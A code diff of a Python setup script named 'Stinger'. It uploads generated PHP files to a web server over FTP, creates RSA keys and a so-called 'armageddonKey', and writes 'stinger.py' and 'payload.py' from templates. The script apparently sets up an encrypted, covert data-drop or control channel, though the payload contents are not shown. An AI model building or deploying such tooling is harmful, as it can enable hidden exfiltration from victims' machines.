@@ -4,7 +4,7 @@
 import ftplib, argparse, os, requests, rsa
 from jinja2 import Environment, FileSystemLoader
 
-# Initialization
+# Parser Initialization
 parser = argparse.ArgumentParser()
 
 # Website Arguments
@@ -15,11 +15,11 @@ parser.add_argument("-ssl", help="Site SSL Encryption Set", required=False, defa
 parser.add_argument("-ftp", "--ftpServer", help="FTP Server Address", required=True)
 parser.add_argument("-ftpu", "--ftpUser", help="FTP Username", required=True)
 parser.add_argument("-ftpp", "--ftpPass", help="FTP Password", required=True)
-parser.add_argument("-port", help="FTP Port", required=False, type=int, default=21)
-parser.add_argument("-path", help="FTP Path", required=False)
+parser.add_argument("-port", "--ftpPort" ,help="FTP Port", required=False, type=int, default=21)
+parser.add_argument("-path", "--ftpPath" ,help="FTP Path", required=False)
 
 # MySQL Arguments
-parser.add_argument("-sqlh", "--sqlHost", help="MySQL Host", required=True)
+parser.add_argument("-sql", "--sqlHost", help="MySQL Host", required=True)
 parser.add_argument("-sqlu", "--sqlUser", help="MySQL Username", required=True)
 parser.add_argument("-sqlp", "--sqlPass", help="MySQL Password", required=True)
 parser.add_argument("-sqln", "--sqlName", help="MySQL Name", required=True)
@@ -40,42 +40,43 @@ try:
     print("Starting Stinger Setup...")
     # FTP Connection
     ftpServer = ftplib.FTP()
-    ftpServer.connect(args.ftpServer, args.port)
+    ftpServer.connect(args.ftpServer, args.ftpPort)
     ftpServer.login(args.ftpUser, args.ftpPass)
-    print("Successfully connected to FTP Server")
-    if args.path:
-        ftpServer.cwd(args.path)
+    print("Connected to FTP Server")
+    if args.ftpPath:
+        ftpServer.cwd(args.ftpPath)
         
-    # Generate data
-    table = os.urandom(16).hex()
+    # Database Variables
+    print("Generating Variables & Keys")
+    tableName = os.urandom(16).hex() 
     tableID = os.urandom(16).hex()
-    tableRNG = int(str(os.urandom(6).hex()), 16)
+    tableBegin = int(str(os.urandom(6).hex()), 16)
+    # Key Generation
     armageddonKey = os.urandom(16).hex()
-    postKey = os.urandom(16).hex()
-    getKey = os.urandom(16).hex()
+    postKey = "key/" + os.urandom(16).hex()
+    getKey = "key/" + os.urandom(16).hex()
+    # RSA Key Generation
     (publicKey, privateKey) = rsa.newkeys(1024)
-    
-    # Variables 
-    getKey = "key/" + getKey;
-    postKey = "key/" + postKey;
     
     # Jinja2 Server Side File Creation
     env = Environment(
         loader=FileSystemLoader("./templates"),
     )
     
-    # Create index.php
+    # Creating Server Side Files
+    print("Creating Server Files")
+    # Create index.php    
     indexTemplate = env.get_template("index.md")
-    renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=table, tableRNG=tableRNG, 
-                                       tableID=tableID, armageddonKey=armageddonKey)
+    renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=tableName, 
+                                       tableBegin=tableBegin, tableID=tableID, armageddonKey=armageddonKey)
     with open(f"index.php","w") as file:
         file.write(renderIndex)
     file.close()
     
     # Create config.php
     configTemplate = env.get_template("config.md")
-    renderConfig = configTemplate.render(host=args.sqlHost, user=args.sqlUser, 
-                                         password=args.sqlPass, database=args.sqlName)
+    renderConfig = configTemplate.render(sqlHost=args.sqlHost, sqlUser=args.sqlUser, 
+                                         sqlPass=args.sqlPass, sqlName=args.sqlName)
     with open(f"config.php","w") as file:
         file.write(renderConfig)
     file.close()
@@ -83,8 +84,6 @@ try:
     # Store files in FTP
     ftpServer.storbinary("STOR index.php", open(f"index.php", "rb"))
     ftpServer.storbinary("STOR config.php", open(f"config.php", "rb"))
-    
-    print("Successfully uploaded files to FTP Server")
     
     # Quit FPT Connection
     ftpServer.quit()
@@ -115,36 +114,38 @@ try:
     else:
         website = "http://www." + args.site
 
+    # Send get request to init table
     request = requests.get(website)
     
     if(request.status_code == 200):
-        print("Successfully connected to website")
+        print("Connected to website")
         # Send Post Request
         request = requests.post(website, headers=postHeader) 
         # Check if post request was successful
         if(request.status_code == 200):
-            print("Successfully sent POST request")
             # Send Get Request
-            request = requests.get(website, params={tableID:tableRNG} ,headers=getHeader) 
+            request = requests.get(website, params={tableID:tableBegin} ,headers=getHeader) 
             # Check if get request was sent successfully
             if(request.status_code == 200):
-                print("Successfully sent GET request")
                 # Get data and decrypt  
                 requestData = request.headers.get("Content-Type")
                 requestData = rsa.decrypt(bytes.fromhex(requestData), privateKey)
                 #  Check if test passed
                 if (requestData == testData):
                     print("Test successful")
-                    
+                else:
+                    print("Failed to sent GET request")   
+            else:
+                print("Failed to sent POST request")       
         # Fix this
         # print("Test failed") 
     else:
         print("Failed to connect to website")
     
     # Create Stinger
-    print("Creating Stinger...")
+    print("Creating Stinger & Payload")
     stingerTemplate = env.get_template("stinger.md")
-    renderStinger = stingerTemplate.render(getKey=getKey, startingPoint=tableRNG , website=website, 
+    renderStinger = stingerTemplate.render(getKey=getKey, tableBegin=tableBegin , website=website, 
                                            tableID=tableID, armageddonKey=armageddonKey, 
                                            privateKey=privateKey)
     with open(f"stinger.py","w") as file:
@@ -152,7 +153,6 @@ try:
     file.close()
     
     # Create Payload
-    print("Creating Payload...")
     payloadTemplate = env.get_template("payload.md")
     renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
     with open(f"payload.py","w") as file:
@@ -162,7 +162,7 @@ try:
     # Delete local files
     os.remove("index.php")
     os.remove("config.php")
-    print("Successfully cleaned up files") 
+    print("Stinger Setup Complete")
     
 except Exception as e:
     print("Error : " + str(e))
